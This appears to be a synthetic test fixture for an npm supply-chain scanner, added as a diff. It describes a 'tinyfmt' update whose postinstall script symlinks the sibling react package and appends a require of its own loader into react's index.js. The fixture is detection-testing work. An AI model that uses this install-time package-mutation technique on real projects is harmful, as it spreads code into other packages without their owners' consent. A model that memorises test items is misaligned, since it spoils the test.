@@ -1,0 +1,58 @@
+{
+  "id": "install-root-shell-ln-cwd",
+  "title": "Existing postinstall hook symlinks a sibling package from another directory with shell ln, then writes through it",
+  "ecosystem": "npm",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "`ln -s ../react ../h` runs with a cwd inside the package, so the link lands in the package root and points at a sibling package, and a later write goes through it. Inert fixture. The source never names the install root, so co-occurrence scoring misses it; reported as a frontier case for propagation.package-mutation.",
+  "expectMinRisk": "high",
+  "expectAnyRule": ["propagation.package-mutation"],
+  "category": "install-time-self-propagation",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 34,
+      "sha256": "prev-install-js",
+      "flags": [],
+      "textSample": "console.log('tinyfmt installed');\n"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 80,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 279,
+      "sha256": "staged-install-js",
+      "flags": [],
+      "textSample": "const { execSync } = require('node:child_process');\nconst fs = require('node:fs');\nconst path = require('node:path');\nexecSync('ln -s ../react ../h', { cwd: path.join(__dirname, 'lib') });\nfs.appendFileSync(path.join(__dirname, 'h', 'index.js'), \"require('tinyfmt/loader');\\n\");\n"
+    }
+  ]
+}
